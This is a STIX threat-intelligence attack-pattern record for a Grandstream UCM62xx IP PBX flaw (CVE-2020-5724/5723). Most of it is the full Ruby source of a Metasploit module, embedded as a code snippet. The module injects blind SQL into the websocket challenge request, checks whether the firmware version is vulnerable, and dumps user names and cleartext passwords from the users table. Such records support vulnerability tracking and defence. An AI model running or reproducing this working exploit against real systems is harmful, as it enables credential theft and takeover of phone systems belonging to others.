{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--4a4e8e8a-6a19-456d-a393-cfd661eb882c",
    "created": "2024-08-14T16:32:28.709148Z",
    "modified": "2024-08-14T16:32:28.709152Z",
    "name": "Grandstream UCM62xx IP PBX WebSocket Blind SQL Injection Credential Dump",
    "description": "No description available.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/grandstream_ucm62xx_sql_account_guess.rb",
            "external_id": "grandstream_ucm62xx_sql_account_guess.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-5724"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-5723"
        },
        {
            "source_name": "reference",
            "url": "https://firmware.grandstream.com/Release_Note_UCM6xxx_1.0.20.22.pdf"
        },
        {
            "source_name": "reference",
            "url": "https://raw.githubusercontent.com/tenable/poc/master/grandstream/ucm62xx/dump_http_user_creds.py"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Remote::HttpClient\n  include Rex::Proto::Http::WebSocket\n  include Msf::Auxiliary::Report\n  include Msf::Exploit::SQLi\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Grandstream UCM62xx IP PBX WebSocket Blind SQL Injection Credential Dump',\n        'Description' => %q{\n          This module uses a blind SQL injection (CVE-2020-5724) affecting the Grandstream UCM62xx\n          IP PBX to dump the users table. The injection occurs over a websocket at the websockify\n          endpoint, and specifically occurs when the user requests the challenge (as part of a\n          challenge and response authentication scheme). The injection is blind, but the server\n          response contains a different status code if the query was successful. As such, the\n          attacker can guess the contents of the user database. Most helpfully, the passwords are\n          stored in cleartext within the user table (CVE-2020-5723).\n\n          This issue was patched in Grandstream UCM62xx IP PBX firmware version 1.20.22.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'jbaines-r7' # Vulnerability discovery, original poc, and Metasploit module\n        ],\n        'References' => [\n          [ 'CVE', '2020-5724' ],\n          [ 'CVE', '2020-5723'],\n          [ 'URL', 'https://firmware.grandstream.com/Release_Note_UCM6xxx_1.0.20.22.pdf'],\n          [ 'URL', 'https://raw.githubusercontent.com/tenable/poc/master/grandstream/ucm62xx/dump_http_user_creds.py']\n        ],\n        'DisclosureDate' => '2020-03-30',\n        'DefaultOptions' => {\n          'RPORT' => 8089,\n          'SSL' => true\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'SideEffects' => [],\n          'Reliability' => []\n        }\n      )\n    )\n    register_options([\n      OptString.new('TARGETURI', [true, 'Base path', '/'])\n    ])\n  end\n\n  # Craft the SQL injection into the challenge request\n  def create_injection_request(query)\n    id = Rex::Text.rand_text_alphanumeric(12)\n    req = \"{\\\"type\\\":\\\"request\\\",\\\"message\\\":{\\\"transactionid\\\":\\\"#{id}\\\",\\\"version\\\":\\\"1.0\\\",\\\"action\\\":\\\"challenge\\\",\\\"username\\\":\\\"\"\n    req.concat(\"\\' OR \")\n    req.concat(query)\n    req.concat('--\"}}')\n    req\n  end\n\n  # Retrieve the server's response and pull out the status response. The return value is\n  # the server's response value (or 1 on failure).\n  def recv_wsframe_status(wsock)\n    res = wsock.get_wsframe\n    return 1 unless res\n\n    begin\n      res_json = JSON.parse(res.payload_data)\n    rescue JSON::ParserError\n      fail_with(Failure::UnexpectedReply, 'Failed to parse the returned JSON response.')\n    end\n\n    status = res_json.dig('message', 'status')\n    return 1 if status.nil?\n\n    status\n  end\n\n  # Extract the version from the cgi endpoint and compare against the\n  # known patched version (1.0.20.22)\n  def check\n    normalized_uri = normalize_uri(target_uri.path, '/cgi')\n    print_status(\"Requesting version information from #{normalized_uri}\")\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalized_uri,\n      'vars_post' => { 'action' => 'getInfo' }\n    })\n\n    return Exploit::CheckCode::Unknown('No response from target!') unless res && (res.code == 200)\n\n    body_json = res.get_json_document\n    return Exploit::CheckCode::Unknown(\"Got response from target but it didn't contain a JSON body!\") if body_json.empty?\n\n    prog_version = body_json.dig('response', 'prog_version')\n    return Exploit::CheckCode::Unknown('JSON response obtained from target, but no prog_version field could be found!') if prog_version.nil?\n\n    if Rex::Version.new(prog_version) < Rex::Version.new('1.0.20.22')\n      return Exploit::CheckCode::Appears(\"The self-reported version is: #{prog_version}\")\n    end\n\n    Exploit::CheckCode::Safe(\"The self-reported version is: #{prog_version}\")\n  end\n\n  def run\n    sqli = create_sqli(dbms: SQLitei::BooleanBasedBlind) do |payload|\n      wsock = connect_ws(\n        'method' => 'GET',\n        'uri' => normalize_uri(target_uri.path, '/websockify')\n      )\n\n      wsock.put_wstext(create_injection_request(payload))\n      recv_wsframe_status(wsock) == 0\n\n    rescue Rex::Proto::Http::WebSocket::ConnectionError => e\n      res = e.http_response\n      fail_with(Failure::Unreachable, e.message) if res.nil?\n      fail_with(Failure::Unknown, e.message)\n    end\n\n    users = sqli.dump_table_fields('users', ['user_name', 'user_password'])\n    users.each do |user|\n      print_status(\"Found the following username and password: #{user[0]} - #{user[1]}\")\n      store_valid_credential(user: user[0], private: user[1])\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2020-03-30"
}